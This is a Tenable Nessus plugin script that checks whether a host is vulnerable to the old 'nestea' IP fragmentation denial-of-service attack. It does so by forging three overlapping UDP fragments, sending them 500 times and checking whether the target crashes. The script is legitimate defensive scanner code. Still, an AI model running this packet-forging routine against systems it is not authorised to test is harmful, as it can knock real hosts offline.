#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(10148);
  script_version("$Revision: 1.32 $");
  script_cvs_date("$Date: 2016/11/23 20:31:33 $");

  script_cve_id("CVE-1999-0257");
  script_bugtraq_id(7219);
  script_osvdb_id(5729);

  script_name(english:"TCP/IP Fragmentation DoS (nestea)");
  script_summary(english:"Crashes the remote host using the 'nestea' attack");

  script_set_attribute(attribute:"synopsis", value:"The remote service is prone to a denial of service attack.");
  script_set_attribute(attribute:"description", value:
"It was possible to make the remote server crash using the 'nestea'
attack.

An attacker may use this flaw to shut down this server, thus
preventing your network from working properly");
  script_set_attribute(attribute:"solution", value:
"Contact your operating system vendor for the appropriate patch or
upgrade.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"see_also", value:"http://insecure.org/sploits/linux.PalmOS.nestea.html");

  script_set_attribute(attribute:"vuln_publication_date", value:"1998/04/16");
  script_set_attribute(attribute:"plugin_publication_date", value:"1999/06/22");

  script_set_attribute(attribute:"potential_vulnerability", value:"true");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_end_attributes();

  script_category(ACT_KILL_HOST);

  script_copyright(english:"This script is Copyright (C) 1999-2016 Tenable Network Security, Inc.");
  script_family(english:"Denial of Service");

  script_require_keys("Settings/ParanoidReport");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");

if (report_paranoia < 2) audit(AUDIT_PARANOID);

if ( TARGET_IS_IPV6 ) exit(0);
start_denial();


# Don't read back the answers


# Our "constants"
MAGIC = 108;
IPH   = 20;
UDPH  = 8;
PADDING = 256;
IP_ID = 242;
sport = 123;
dport = 137;

ip = forge_ip_packet(ip_v : 4,
		     ip_hl : 5,
		     ip_tos : 0,
		     ip_id  : IP_ID,
		     ip_len : IPH + UDPH + 10,
		     ip_off : 0|IP_MF,
		     ip_p   : IPPROTO_UDP,
		     ip_src : this_host(),
		     ip_ttl : 0x40);
# Forge the first udp packet
udp1 = forge_udp_packet(ip : ip,
			uh_sport : sport,
			uh_dport : dport,
			uh_ulen : UDPH + 10);

# Change some params in the ip packet
ip = set_ip_elements(ip:ip, ip_len : IPH + UDPH + MAGIC,
		       ip_off : 6);

# Forge the second udp packet
udp2 = 	forge_udp_packet(ip : ip,
			uh_sport : sport,
			uh_dport : dport,
			uh_ulen : UDPH + MAGIC);

# Change some params one more
ip = set_ip_elements(ip : ip, ip_len : IPH + UDPH + PADDING + 40,
	        ip_off : 0|IP_MF);

# data = 'XXX.....XX'

data = crap(PADDING);
# Forge the third udp packet
udp3 = 	forge_udp_packet(ip : ip,
			uh_sport : sport,
			uh_dport : dport,
			uh_ulen : UDPH + PADDING,
			data : data);

# Send our udp packets 500 times
send_packet(udp1, udp2, udp3, pcap_active:FALSE) x 500;

sleep(5);
alive = end_denial();
if(!alive){
                set_kb_item(name:"Host/dead", value:TRUE);
                security_hole(port:0, protocol:"udp");
                }
